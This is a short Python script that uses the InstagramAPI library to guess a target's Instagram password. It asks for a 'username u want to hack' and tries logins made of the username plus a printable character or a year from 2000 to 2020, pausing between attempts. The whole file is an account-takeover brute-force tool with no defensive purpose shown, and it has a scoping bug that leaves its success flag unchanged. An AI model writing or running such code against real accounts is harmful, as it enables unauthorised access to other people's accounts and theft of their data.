from InstagramAPI import InstagramAPI
import string 
import time



username=input("enter username u want to hack:")
password2 = ""
password3 = ""
is_succeed = False


def login(username , password):
    api = InstagramAPI(username , password)
    if api.login(): 
        return True
    else:
        return False



def chars_way():
        printables_chars = string.printable
        for i, char in enumerate(printables_chars):
            password2 = username + char
            print("----------------------" + password2 + "-------------------------------")
            if login(username,password2):
                print("we found it!! the password is :   "+password2)
                is_succeed = True
                break 


def date_way():
    year = 2000 
    while ( year <= 2020 ):
        password2 = username + str(year)
        log = login(username , password2)
        print("----------------------" + password2 + "-------------------------------")
        if log:
            print( "$$$$$$$$$$$$$$  we found it!! the password is :  [ "+password2 + " ]  $$$$$$$$$$$$$$" )
            is_succeed = log
            break
        else:
            time.sleep(4)
            year += 1







def main():
   date_way()
   if is_succeed == False:
       chars_way()



main()